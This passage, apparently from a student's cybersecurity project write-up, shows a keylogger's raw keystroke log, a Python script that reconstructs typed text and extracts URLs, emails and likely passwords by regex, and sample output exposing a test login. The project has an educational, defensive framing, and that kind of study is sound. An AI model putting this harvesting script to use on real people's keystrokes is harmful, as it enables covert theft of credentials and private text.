    Fri Dec 13 16:35:45 2024 - Key.backspace
    Fri Dec 13 16:35:45 2024 - Key.backspace
    Fri Dec 13 16:35:45 2024 - Key.backspace
    Fri Dec 13 16:35:45 2024 - Key.backspace
    Fri Dec 13 16:35:46 2024 - a
    Fri Dec 13 16:35:46 2024 - c
    Fri Dec 13 16:35:46 2024 - c
    Fri Dec 13 16:35:46 2024 - o
    Fri Dec 13 16:35:47 2024 - u
    Fri Dec 13 16:35:47 2024 - n
    Fri Dec 13 16:35:47 2024 - t
    Fri Dec 13 16:35:48 2024 - h
    Fri Dec 13 16:35:48 2024 - e
    Fri Dec 13 16:35:48 2024 - l
    Fri Dec 13 16:35:49 2024 - p
    Fri Dec 13 16:35:49 2024 - .
    Fri Dec 13 16:35:50 2024 - e
    Fri Dec 13 16:35:50 2024 - d
    Fri Dec 13 16:35:50 2024 - u
    Fri Dec 13 16:35:53 2024 - Key.space
    Fri Dec 13 16:35:54 2024 - o
    Fri Dec 13 16:35:54 2024 - n
    Fri Dec 13 16:35:54 2024 - Key.space
    Fri Dec 13 16:35:54 2024 - w
    Fri Dec 13 16:35:54 2024 - h
    Fri Dec 13 16:35:54 2024 - a
    Fri Dec 13 16:35:55 2024 - t
    Fri Dec 13 16:35:55 2024 - Key.space
    Fri Dec 13 16:35:55 2024 - t
    Fri Dec 13 16:35:55 2024 - o
    Fri Dec 13 16:35:56 2024 - Key.space
    Fri Dec 13 16:35:56 2024 - d
    Fri Dec 13 16:35:56 2024 - o
    Fri Dec 13 16:35:56 2024 - Key.space
    Fri Dec 13 16:35:57 2024 - a
    Fri Dec 13 16:35:57 2024 - n
    Fri Dec 13 16:35:57 2024 - d
    Fri Dec 13 16:35:58 2024 - Key.space
    Fri Dec 13 16:35:58 2024 - h
    Fri Dec 13 16:35:58 2024 - o
    Fri Dec 13 16:35:58 2024 - w
    Fri Dec 13 16:35:58 2024 - Key.space
    Fri Dec 13 16:35:58 2024 - t
    Fri Dec 13 16:35:58 2024 - o
    Fri Dec 13 16:35:59 2024 - Key.space
    Fri Dec 13 16:36:00 2024 - k
    Fri Dec 13 16:36:00 2024 - e
    Fri Dec 13 16:36:00 2024 - e
    Fri Dec 13 16:36:00 2024 - p
    Fri Dec 13 16:36:00 2024 - Key.space
    Fri Dec 13 16:36:00 2024 - m
    Fri Dec 13 16:36:00 2024 - y
    Fri Dec 13 16:36:01 2024 - s
    Fri Dec 13 16:36:01 2024 - e
    Fri Dec 13 16:36:01 2024 - l
    Fri Dec 13 16:36:01 2024 - f
    Fri Dec 13 16:36:01 2024 - Key.space
    Fri Dec 13 16:36:01 2024 - s
    Fri Dec 13 16:36:02 2024 - a
    Fri Dec 13 16:36:02 2024 - d
    Fri Dec 13 16:36:03 2024 - Key.backspace
    Fri Dec 13 16:36:03 2024 - f
    Fri Dec 13 16:36:03 2024 - e
    Fri Dec 13 16:36:04 2024 - .
    Fri Dec 13 16:36:04 2024 - Key.backspace
    Fri Dec 13 16:36:05 2024 - Key.space
    Fri Dec 13 16:36:05 2024 - f
    Fri Dec 13 16:36:05 2024 - r
    Fri Dec 13 16:36:05 2024 - o
    Fri Dec 13 16:36:05 2024 - m
    Fri Dec 13 16:36:05 2024 - Key.space
    Fri Dec 13 16:36:06 2024 - a
    Fri Dec 13 16:36:06 2024 - Key.space
    Fri Dec 13 16:36:07 2024 - k
    Fri Dec 13 16:36:07 2024 - e
    Fri Dec 13 16:36:07 2024 - y
    Fri Dec 13 16:36:07 2024 - l
    Fri Dec 13 16:36:07 2024 - o
    Fri Dec 13 16:36:08 2024 - g
    Fri Dec 13 16:36:08 2024 - g
    Fri Dec 13 16:36:08 2024 - e
    Fri Dec 13 16:36:08 2024 - r
    Fri Dec 13 16:36:08 2024 - .
    Fri Dec 13 16:36:09 2024 - Key.space
    Fri Dec 13 16:36:09 2024 - Key.shift_r
    Fri Dec 13 16:36:10 2024 - O
    Fri Dec 13 16:36:10 2024 - r
    Fri Dec 13 16:36:10 2024 - Key.space
    Fri Dec 13 16:36:10 2024 - i
    Fri Dec 13 16:36:10 2024 - Key.space
    Fri Dec 13 16:36:11 2024 - c
    Fri Dec 13 16:36:11 2024 - a
    Fri Dec 13 16:36:11 2024 - n
    Fri Dec 13 16:36:11 2024 - Key.space
    Fri Dec 13 16:36:12 2024 - j
    Fri Dec 13 16:36:12 2024 - u
    Fri Dec 13 16:36:12 2024 - s
    Fri Dec 13 16:36:12 2024 - t
    Fri Dec 13 16:36:12 2024 - Key.space
    Fri Dec 13 16:36:14 2024 - h
    Fri Dec 13 16:36:14 2024 - i
    Fri Dec 13 16:36:14 2024 - t
    Fri Dec 13 16:36:14 2024 - Key.space
    Fri Dec 13 16:36:15 2024 - t
    Fri Dec 13 16:36:15 2024 - h
    Fri Dec 13 16:36:15 2024 - e
    Fri Dec 13 16:36:15 2024 - Key.space
    Fri Dec 13 16:36:15 2024 - e
    Fri Dec 13 16:36:15 2024 - s
    Fri Dec 13 16:36:16 2024 - c
    Fri Dec 13 16:36:16 2024 - Key.space
    Fri Dec 13 16:36:16 2024 - k
    Fri Dec 13 16:36:16 2024 - e
    Fri Dec 13 16:36:17 2024 - y
    Fri Dec 13 16:36:17 2024 - Key.space
    Fri Dec 13 16:36:17 2024 - t
    Fri Dec 13 16:36:17 2024 - o
    Fri Dec 13 16:36:18 2024 - Key.space
    Fri Dec 13 16:36:18 2024 - s
    Fri Dec 13 16:36:18 2024 - t
    Fri Dec 13 16:36:18 2024 - o
    Fri Dec 13 16:36:18 2024 - p
    Fri Dec 13 16:36:19 2024 - Key.space
    Fri Dec 13 16:36:19 2024 - t
    Fri Dec 13 16:36:19 2024 - h
    Fri Dec 13 16:36:19 2024 - i
    Fri Dec 13 16:36:19 2024 - s
    Fri Dec 13 16:36:19 2024 - Key.space
    Fri Dec 13 16:36:20 2024 - k
    Fri Dec 13 16:36:20 2024 - e
    Fri Dec 13 16:36:20 2024 - y
    Fri Dec 13 16:36:20 2024 - l
    Fri Dec 13 16:36:20 2024 - o
    Fri Dec 13 16:36:21 2024 - g
    Fri Dec 13 16:36:21 2024 - g
    Fri Dec 13 16:36:21 2024 - e
    Fri Dec 13 16:36:21 2024 - r
    Fri Dec 13 16:36:22 2024 - Key.esc
</details>


---

Once the keylogging phase is complete, the log analysis script processes the data to extract meaningful insights.
First, the script reads the raw log file and removes timestamps and unnecessary formatting, leaving only the recorded keystrokes. 
It then reconstructs the keystrokes into coherent text by handling spaces, backspaces, and other formatting nuances. From the reconstructed text, 
the script identifies patterns useful for analysis, such as the most common words, URLs, emails, and potential passwords, which are detected using regular expressions
to match specific patterns. The results are then output to a new file, extracted_words.txt, which provides a detailed summary of the reconstructed text, the most frequently
used word, any identified URLs, emails, and passwords. This project highlights how keyloggers can be used to gain intelligence and emphasizes the importance of understanding
these tools from a cybersecurity perspective to recognize potential threats and defend against them.

Below is the next script in python that analyzes the raw data to extract valuable information:
```
import re
from collections import Counter

# Function to read the raw log file
def read_log_file(file_path):
    with open(file_path, "r") as file:
        return file.readlines()


# Function to remove timestamps and clean up lines
def clean_log_lines(log_lines):
    cleaned_lines = []
    
    first_line = log_lines[0].strip()  

    for line in log_lines[1:]:
        # Remove timestamp pattern 
        cleaned_line = re.sub(r".*?-", "", line).strip() 
        cleaned_lines.append(cleaned_line)
    
    return cleaned_lines, first_line


# Function to reconstruct the keystrokes into words
def reconstruct_text(cleaned_lines):
    text = ""
    for line in cleaned_lines:
        if line.startswith("Key.space"):
            text += " "
        elif line.startswith("Key.backspace"):
            text = text[:-1]
        elif line.startswith("Key.") or line == "Key.enter":  # Skip special keys
            continue
        else:
            text += line  # Add the valid keypresses (letters,numbers,punctuation)
    return text


# Function to extract words from the reconstructed text - also making sure URLs and emails stay constructed
def extract_words_and_urls(text):
    valid_domains = ['com', 'org', 'net', 'gov', 'edu', 'io', 'co', 'me', 'us']
    
    # Email pattern with regex: [words]@[words].[words]
    email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b'
    emails = re.findall(email_pattern, text)
    
    # Modify the regex to match words, punctuation, and URLs
    words_and_urls = []
    words = re.findall(r"\b\w+\b|[.,!?;()/@&*^%#$~=+]", text)

    # Combine URLs as well as domains
    i = 0
    while i < len(words):
        if i + 2 < len(words) and words[i].isalpha() and words[i + 1] == "." and words[i + 2] in valid_domains:
            # This is a domain, treat it as a URL
            words_and_urls.append(words[i] + "." + words[i + 2])
            i += 3  

        elif i + 2 < len(words) and words[i].isalpha() and words[i + 1] == "@" and words[i + 2].isalpha():
            # This is an email, treat it as such
            words_and_urls.append(words[i] + "@" + words[i + 2])
            i += 3  
            
        else:
            words_and_urls.append(words[i])
            i += 1


    if i == len(words) - 1:  
        words_and_urls.append(words[i])

    return words_and_urls, emails


def get_only_words(text):
    # Extract words consisting of letters, digits, or underscores
    STOP_WORDS = {"a", "an", "and", "the", "is", "are", "of", "to", "in", "on", "for", "it", "with", "at", "by", "this"}
    words_only = re.findall(r'\b\w+\b', text)
    filtered_words = [word for word in words_only if word.lower() not in STOP_WORDS]
    return filtered_words

# Function to detect the most common word with it's count
def detect_most_common_word(words):
    
    word_counts = Counter(words)
    most_common_word, count = word_counts.most_common(1)[0]  
    return most_common_word, count


# Function to detect URLs
def detect_urls(words):
    # URL pattern without the '@' symbol, allowing for domains like example.com
    url_pattern = re.compile(r'\b(?:[a-zA-Z0-9-]+\.)+(?:com|org|net|gov|edu|io|co|me|us)\b')

    urls = []
    for word in words:
        # Exclude words containing '@' to prevent emails from being detected as URLs
        if '@' not in word and url_pattern.match(word):
            urls.append(word)
    
    return urls


# Function to detect passwords (odd letters combined with numbers and special characters)
def detect_passwords(text):
    password_pattern = r"\b[A-Za-z0-9!@#$%^&*()_+={}\[\]:;'\"<>,.?/\\|-]*\d+[A-Za-z0-9!@#$%^&*()_+={}\[\]:;'\"<>,.?/\\|-]+\b"
    passwords = [word for word in text.split() if re.match(password_pattern, word)]
    return passwords


# Function to output the extracted words to a file
def output_to_file(words, first_line, output_file, most_common_word, count, urls, passwords, emails):
    with open(output_file, "w") as file:
        # Write the first line (timestamp)
        file.write(first_line + "\n\n")
        
        # Write the reconstructed words at the top
        file.write(" ".join(words) + "\n")
        file.write("---------------------------------------------------------------\n\n")
        
        # Most common word
        file.write(f"Most common word: '{most_common_word}' (appears {count} times)\n")
        file.write("---------------------------------------------------------------\n\n")        
        # URLs section
        if urls:
            file.write(f"URLs Found: {urls}\n")
        else:
            file.write("No URLs Found.\n")
        file.write("---------------------------------------------------------------\n\n")        
        # Passwords section
        if passwords:
            file.write(f"Potential Passwords found: {passwords}\n")
        else:
            file.write("No Passwords detected.\n")
        file.write("---------------------------------------------------------------\n\n")        
        # Emails section
        if emails:
            file.write(f"Emails Found: {emails}\n")
        else:
            file.write("No Emails Found.\n")
        file.write("---------------------------------------------------------------\n\n")




def main():
    input_file = "raw_log.txt"  
    output_file = "extracted_words.txt"  

    log_lines = read_log_file(input_file)
    
    cleaned_lines, first_line = clean_log_lines(log_lines)

    reconstructed_text = reconstruct_text(cleaned_lines)

    passwords = detect_passwords(reconstructed_text)

    all_words,emails = extract_words_and_urls(reconstructed_text)

    cleaned_words = get_only_words(reconstructed_text)

    most_common_word, count = detect_most_common_word(cleaned_words)

    urls = detect_urls(all_words)

    output_to_file(all_words, first_line, output_file, most_common_word, count, urls, passwords, emails)
    print(f"Words have been output to {output_file}")

if __name__ == "__main__":
    main()
```

---

Here is then the final output of the extracted information from the previous script:

```
Keylogger started at: Fri Dec 13 16:32:25 2024

This is a keylogger test , this is all being logged from a keylogger . This keylogger will pick up every key stroke . That is scary ! Then it will be analyzed . Hopefully I don t go to a website like TryHackMe.com and type in my credentials . Which being keylogged@example . com and my password being P @ $ $ W0rd ! 99 for the website . That keylogger will log that in and might find a tutorial for a tryhackme room on youtube.com with my account ! Might have to email tryhackme@support . com or go to accounthelp.edu on what to do and how to keep myself safe from a keylogger . Or i can just hit the esc key to stop this keylogger
---------------------------------------------------------------

Most common word: 'keylogger' (appears 6 times)
---------------------------------------------------------------

URLs Found: ['TryHackMe.com', 'youtube.com', 'accounthelp.edu']
---------------------------------------------------------------

Potential Passwords found: ['P@$$W0rd!99']
---------------------------------------------------------------

Emails Found: ['keylogged@example.com', 'tryhackme@support.com']
---------------------------------------------------------------
```
